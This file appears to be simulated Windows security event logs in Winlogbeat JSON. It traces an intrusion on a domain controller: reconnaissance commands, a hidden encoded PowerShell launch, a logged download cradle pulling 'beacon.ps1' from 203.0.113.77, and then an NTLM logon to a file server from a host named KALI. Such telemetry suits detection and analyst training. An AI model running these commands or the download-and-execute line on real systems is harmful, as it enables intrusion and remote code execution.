{"@timestamp": "2026-06-17T13:18:00Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\whoami.exe  Command: whoami /all", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "whoami.exe", "executable": "C:\\Windows\\System32\\whoami.exe", "command_line": "whoami /all", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:06Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\net.exe  Command: net user /domain", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user /domain", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "net.exe", "executable": "C:\\Windows\\System32\\net.exe", "command_line": "net user /domain", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:12Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\net.exe  Command: net group \"Domain Admins\" /domain", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group \"Domain Admins\" /domain", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "net.exe", "executable": "C:\\Windows\\System32\\net.exe", "command_line": "net group \"Domain Admins\" /domain", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:18Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\nltest.exe  Command: nltest /dclist:corp.local", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /dclist:corp.local", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "nltest.exe", "executable": "C:\\Windows\\System32\\nltest.exe", "command_line": "nltest /dclist:corp.local", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:24Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\systeminfo.exe  Command: systeminfo", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\systeminfo.exe", "CommandLine": "systeminfo", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "systeminfo.exe", "executable": "C:\\Windows\\System32\\systeminfo.exe", "command_line": "systeminfo", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:30Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\ipconfig.exe  Command: ipconfig /all", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig /all", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "ipconfig.exe", "executable": "C:\\Windows\\System32\\ipconfig.exe", "command_line": "ipconfig /all", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:18:36Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\tasklist.exe  Command: tasklist /v", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\tasklist.exe", "CommandLine": "tasklist /v", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "tasklist.exe", "executable": "C:\\Windows\\System32\\tasklist.exe", "command_line": "tasklist /v", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:20:00Z", "message": "A new process has been created. Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  Command: powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4688, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4688", "kind": "event", "category": ["process"], "type": ["start"], "action": "created-process"}, "user": {"name": "irwin.t", "domain": "CORP"}, "process": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "parent": {"executable": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:20:01Z", "message": "Creating Scriptblock text: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/u/beacon.ps1'", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": 4104, "provider_name": "Microsoft-Windows-PowerShell", "computer_name": "DC01.corp.local", "event_data": {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/u/beacon.ps1')", "MessageNumber": "1", "MessageTotal": "1"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-PowerShell", "code": "4104", "kind": "event", "category": ["process"], "type": ["info"], "action": "script-block-logged"}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:22:10Z", "message": "A logon was attempted using explicit credentials. Subject: irwin.t  Target: irwin.t  Server: FS01", "log": {"level": "information"}, "host": {"name": "FS01", "hostname": "FS01", "ip": ["10.0.0.20"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "FS01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4648, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "FS01.corp.local", "event_data": {"SubjectUserName": "irwin.t", "SubjectDomainName": "CORP", "TargetUserName": "irwin.t", "TargetServerName": "FS01", "IpAddress": "203.0.113.77"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4648", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logged-in-explicit"}, "user": {"name": "irwin.t", "domain": "CORP", "target": {"name": "irwin.t", "domain": "CORP"}}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["irwin.t", "irwin.t"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:22:11.400000Z", "message": "An account was successfully logged on. Account: CORP\\irwin.t  Logon Type: 3 (Network)  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "FS01", "hostname": "FS01", "ip": ["10.0.0.20"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "FS01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4624, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "FS01.corp.local", "event_data": {"TargetUserName": "irwin.t", "TargetDomainName": "CORP", "LogonType": "3", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "44831"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4624", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logged-in", "outcome": "success"}, "user": {"name": "irwin.t", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["irwin.t"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:22:11Z", "message": "The domain controller attempted to validate credentials (success). Account: irwin.t", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "irwin.t", "Status": "0x0"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "success"}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:22:12Z", "message": "A Kerberos service ticket was requested. Account: CORP\\irwin.t  Service: FS01$", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4769, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "irwin.t", "TargetDomainName": "CORP", "TicketEncryptionType": "0x12", "ServiceName": "FS01$"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4769", "kind": "event", "category": ["authentication"], "type": ["start"]}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:22:41.785000Z", "message": "An account was successfully logged on. Account: CORP\\irwin.t  Logon Type: 7 (Unlock)  Source: local", "log": {"level": "information"}, "host": {"name": "WS02", "hostname": "WS02", "ip": ["10.0.0.52"], "os": {"type": "windows", "name": "Windows 10 Enterprise", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "WS02"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4624, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "WS02.corp.local", "event_data": {"TargetUserName": "irwin.t", "TargetDomainName": "CORP", "LogonType": "7", "LogonProcessName": "User32 ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "WS02", "IpAddress": "-"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4624", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logged-in", "outcome": "success"}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
